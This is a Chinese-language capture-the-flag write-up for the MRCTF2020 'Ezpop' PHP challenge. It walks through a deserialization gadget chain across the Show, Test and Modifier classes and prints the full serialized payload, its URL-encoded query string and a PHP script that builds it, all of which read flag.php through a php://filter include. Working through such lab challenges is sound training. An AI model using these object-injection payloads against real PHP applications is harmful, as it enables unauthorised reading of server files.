[MRCTF2020]Ezpop

反序列化理解起来感觉有点绕，熟能生巧嘛。

题解

进入题目页给出代码：

Welcome to index.php
<?php
class Modifier {
    protected  $var;
    public function append($value){
        include($value);
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __construct($file='index.php'){
        $this->source = $file;
        echo 'Welcome to '.$this->source."<br>";
    }
    public function __toString(){
        return $this->str->source;
    }

    public function __wakeup(){
        if(preg_match("/gopher|http|file|ftp|https|dict|\.\./i", $this->source)) {
            echo "hacker";
            $this->source = "index.php";
        }
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    @unserialize($_GET['pop']);
}
else{
    $a=new Show;
    highlight_file(__FILE__);
}

通过pop传参读取flag.php文件,在Modifier类中，存在任意文件包含include关键字，所以首先就是构造Modifier对象序列化字符串，然后就需要其他的来触发这个__invoke()，即将对象当作函数调用时触发。

继续看下面两个类：Show和Test。

在Show类中，存在两个属性source和str，三个魔术方法：

  • __construct():在使用new创建一个类对象的实例时，会被自动调用。通常用来给对象的属性赋初始值，相当于构造函数。这里是给新对象的source属性赋值。
  • __toString():当对象被当作字符串时自动调用。必须返回字符串，否则报错。这里返回对象的str属性的source属性。
  • __wakeup()：序列化字符串在反序列化完成后会被自动调用。这里存在一个正则表达式preg_match()判断该对象的source匹配第一参数内容。

在Test类中，一属性p两魔术方法__construct()和__get()

  • _get():读取不可访问或未定义的属性时触发。这里使得$function赋值为对象的p属性，然后将其$function()当作函数调用

结合以上，怎么触发__invoke()？我们需要将对象当作函数调用，所以最内层应该是：

O:8:"Modifier":1:{s:3:"var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}

上下文唯一一处将对象当作函数调用是_get()方法，赋值Test对象属性p为Modifier对象，所以第二层：

O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:3:"var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}

考虑如何触发__get()方法，即在读取不可访问或未定义的属性时触发，总观下来即触发__toString()方法，其中返回对象的str属性的source属性，使source不可访问即可。而Show对象的source这里不需要可以设置为N，所以第三层：

O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:3:"var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}

回到最初，pop总归会触发__wakeup()方法，正则表达式preg_match将第二参数也就是对象的source属性当作字符串处理触发toString()，构成完整pop链。这一层的Show对象不需要str属性，设置为N。按照PHP序列化的语法，对象内的属性赋值结束后，不需要在对象的闭合大括号PHP后面再加分号。所以最后一层：

O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:3:"var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N}

忘记了一个细节问题：Modifier类中的var属性是protected类型,在序列化时必须是空字节*空字节属性名格式。

两种解决方法：

  • 把以下payload进行URL编码，然后在*左右添加%00。
  • 使用PHP脚本构造序列化。

第一个方法：

O:4:"Show":2:{s:6:"source";O:4:"Show":2:{s:6:"source";N;s:3:"str";O:4:"Test":1:{s:1:"p";O:8:"Modifier":1:{s:6:"*var";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}}}s:3:"str";N;}

这里的Modifier对象属性var必须是六个字符符合空字节*空字节var格式。URL编码后添加%00。

?pop=O%3A4%3A"Show"%3A2%3A%7Bs%3A6%3A"source"%3BO%3A4%3A"Show"%3A2%3A%7Bs%3A6%3A"source"%3BN%3Bs%3A3%3A"str"%3BO%3A4%3A"Test"%3A1%3A%7Bs%3A1%3A"p"%3BO%3A8%3A"Modifier"%3A1%3A%7Bs%3A6%3A"%00*%00var"%3Bs%3A57%3A"php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php"%3B%7D%7D%7Ds%3A3%3A"str"%3BN%3B%7D

第二个方法：
PHP脚本

<?php
class Modifier{
    protected $var = "php://filter/read=convert.base64-encode/resource=flag.php";
}
class Test{
    public $p;
}
class Show{
    public $source;
    public $str;
}

//搭建链
$mod = new Modifier();
$test = new Test();
$test->p = $mod;

$innerShow = new Show();
$outerShow = new Show();

$innerShow->source = null;
$innerShow->str = $test;

$outerShow->source = $innerShow;
$outerShow->str = null;

echo urlencode(serialize($outerShow));
?>

运行结束后获得方法一同等payload。输入获取flag。
